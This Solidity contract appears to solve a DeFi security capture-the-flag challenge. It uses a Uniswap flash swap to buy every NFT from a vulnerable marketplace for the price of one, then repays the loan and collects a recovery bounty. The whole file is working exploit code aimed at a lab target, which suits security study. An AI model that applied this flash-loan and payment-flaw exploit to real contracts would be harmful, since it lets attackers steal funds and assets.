// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INFTMarketPlace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract AttackFreeRider {
    address private player;
    uint256 private nftPrice;
    uint256 private amountOfNFTs;
    IUniswapPair private uniswapPair;
    INFTMarketPlace private marketplace;
    address private recoveryManager;
    IWETH private weth;
    IERC721 private nft;

    constructor(
        uint256 _nftPrice,
        uint256 _amountOfNFTs,
        address _uniswapPairAddress,
        address _marketplaceAddress,
        address _recoveryManager,
        address _weth,
        address _nft
    ) {
        player = msg.sender;
        nftPrice = _nftPrice;
        amountOfNFTs = _amountOfNFTs;
        uniswapPair = IUniswapPair(_uniswapPairAddress);
        marketplace = INFTMarketPlace(_marketplaceAddress);
        recoveryManager = _recoveryManager;
        weth = IWETH(_weth);
        nft = IERC721(_nft);
    }

    function attack() external {
        bytes memory data = abi.encode(weth, msg.sender);
        // 1. Flash swap
        uniswapPair.swap(nftPrice, 0, address(this), data);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(uniswapPair));
        require(tx.origin == player);

        // 2. Unwrap WETH to ETH
        weth.withdraw(weth.balanceOf(address(this)));

        // 3. Buy all the NFTs
        uint256[] memory tokenIds = new uint256[](amountOfNFTs);
        for (uint256 i = 0; i < amountOfNFTs; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);

        // 4. Wrap ETH to WETH
        uint256 fee = (nftPrice * 3) / 997 + 1;
        uint256 amountToRepay = nftPrice + fee;
        weth.deposit{value: amountToRepay}();

        // 5. Repay WETH
        weth.transfer(address(uniswapPair), amountToRepay);

        // 6. Send NFTs and get rewards
        bytes memory playerData = abi.encode(player);
        for (uint256 i = 0; i < amountOfNFTs; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, i, playerData);
        }

        // 7. Send all the ETH to the player
        (bool sent,) = payable(player).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
